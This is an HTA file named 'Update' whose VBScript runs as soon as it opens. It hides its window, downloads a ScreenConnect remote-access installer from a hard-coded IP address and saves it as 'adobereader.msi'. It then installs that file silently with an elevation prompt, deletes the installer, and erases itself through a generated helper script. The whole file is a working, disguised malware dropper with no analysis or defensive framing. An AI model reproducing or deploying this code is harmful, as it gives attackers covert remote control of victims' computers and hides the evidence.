<!DOCTYPE html>
<html>
<head>
    <title>Update</title>
    <HTA:APPLICATION 
        ID="oUpdate" 
        APPLICATIONNAME="Update" 
        WINDOWSTATE="minimize" 
        BORDER="none" 
        INNERBORDER="no" 
        SCROLL="no" 
        CONTEXTMENU="no" 
        SELECTION="no" 
        NAVIGABLE="no" 
        SHOWINTASKBAR="no" 
        SYSMENU="no" 
    />
</head>
<body>
<script language="VBScript">
    Sub Window_OnLoad
        On Error Resume Next
        Dim oWS, oFSO, sURL, sOut, oHTTP, oStream, oShellApp
        Set oWS = CreateObject("WScript.Shell")
        Set oFSO = CreateObject("Scripting.FileSystemObject")

        sURL = "http://198.23.185.114/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
        sOut = oWS.ExpandEnvironmentStrings("%TEMP%") & "\adobereader.msi"

        ' --- Download MSI ---
        Set oHTTP = CreateObject("MSXML2.XMLHTTP")
        oHTTP.Open "GET", sURL, False
        oHTTP.Send

        If oHTTP.Status = 200 Then
            Set oStream = CreateObject("ADODB.Stream")
            oStream.Type = 1
            oStream.Open
            oStream.Write oHTTP.ResponseBody
            oStream.Position = 0
            oStream.SaveToFile sOut, 2
            oStream.Close

            ' --- Install with UAC prompt ---
            Set oShellApp = CreateObject("Shell.Application")
            oShellApp.ShellExecute "msiexec.exe", "/i " & Chr(34) & sOut & Chr(34) & " /qn /norestart", "", "runas", 0

            ' --- Wait for install to start ---
            WScript.Sleep 5000

            ' --- Wait for msiexec to finish ---
            Dim oWMI, col, found
            Set oWMI = GetObject("winmgmts:\\.\root\cimv2")
            found = False
            Dim i : i = 0
            Do While i < 60
                Set col = oWMI.ExecQuery("Select * from Win32_Process Where Name='msiexec.exe'")
                If col.Count > 0 Then
                    found = True
                    Exit Do
                End If
                WScript.Sleep 1000
                i = i + 1
            Loop

            If found Then
                Do
                    Set col = oWMI.ExecQuery("Select * from Win32_Process Where Name='msiexec.exe'")
                    If col.Count = 0 Then Exit Do
                    WScript.Sleep 1000
                Loop
            End If

            ' --- Delete MSI ---
            On Error Resume Next
            oFSO.DeleteFile sOut, True
            On Error GoTo 0

            ' --- SELF-DELETE (separate VBS) ---
            Dim sDel : sDel = oWS.ExpandEnvironmentStrings("%TEMP%") & "\delete_me.vbs"
            Dim oDel : Set oDel = oFSO.CreateTextFile(sDel, True)
            oDel.WriteLine "On Error Resume Next"
            oDel.WriteLine "Dim oFSO : Set oFSO = CreateObject(""Scripting.FileSystemObject"")"
            oDel.WriteLine "WScript.Sleep 3000"
            oDel.WriteLine "oFSO.DeleteFile " & Chr(34) & WScript.ScriptFullName & Chr(34) & ", True"
            oDel.WriteLine "oFSO.DeleteFile " & Chr(34) & sDel & Chr(34) & ", True"
            oDel.Close

            oWS.Run Chr(34) & sDel & Chr(34), 0, False
            WScript.Quit
        End If

        Self.Close
    End Sub
</script>
</body>
</html>